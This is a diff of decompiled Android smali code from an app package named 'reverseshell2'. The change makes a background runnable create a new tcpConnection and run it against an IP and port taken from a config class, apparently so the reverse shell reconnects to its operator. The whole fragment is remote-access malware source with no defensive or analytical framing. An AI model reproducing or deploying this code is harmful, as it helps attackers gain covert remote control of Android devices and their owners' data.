@@ -26,7 +26,7 @@
     .locals 0
     .param p1, "this$0"    # Lcom/example/reverseshell2/tcpConnection;
 
-    .line 100
+    .line 79
     iput-object p1, p0, Lcom/example/reverseshell2/tcpConnection$1;->this$0:Lcom/example/reverseshell2/tcpConnection;
 
     invoke-direct {p0}, Ljava/lang/Object;-><init>()V
@@ -39,23 +39,37 @@
 .method public run()V
     .locals 4
 
-    .line 103
-    iget-object v0, p0, Lcom/example/reverseshell2/tcpConnection$1;->this$0:Lcom/example/reverseshell2/tcpConnection;
+    .line 82
+    new-instance v0, Lcom/example/reverseshell2/tcpConnection;
 
-    iget-object v0, v0, Lcom/example/reverseshell2/tcpConnection;->context:Landroid/content/Context;
+    iget-object v1, p0, Lcom/example/reverseshell2/tcpConnection$1;->this$0:Lcom/example/reverseshell2/tcpConnection;
 
-    new-instance v1, Landroid/content/Intent;
+    iget-object v1, v1, Lcom/example/reverseshell2/tcpConnection;->activity:Landroid/app/Activity;
 
     iget-object v2, p0, Lcom/example/reverseshell2/tcpConnection$1;->this$0:Lcom/example/reverseshell2/tcpConnection;
 
     iget-object v2, v2, Lcom/example/reverseshell2/tcpConnection;->context:Landroid/content/Context;
 
-    const-class v3, Lcom/example/reverseshell2/mainService;
+    invoke-direct {v0, v1, v2}, Lcom/example/reverseshell2/tcpConnection;-><init>(Landroid/app/Activity;Landroid/content/Context;)V
 
-    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+    const/4 v1, 0x2
 
-    invoke-virtual {v0, v1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
+    new-array v1, v1, [Ljava/lang/String;
 
-    .line 104
+    sget-object v2, Lcom/example/reverseshell2/config;->IP:Ljava/lang/String;
+
+    const/4 v3, 0x0
+
+    aput-object v2, v1, v3
+
+    sget-object v2, Lcom/example/reverseshell2/config;->port:Ljava/lang/String;
+
+    const/4 v3, 0x1
+
+    aput-object v2, v1, v3
+
+    invoke-virtual {v0, v1}, Lcom/example/reverseshell2/tcpConnection;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
+
+    .line 83
     return-void
 .end method
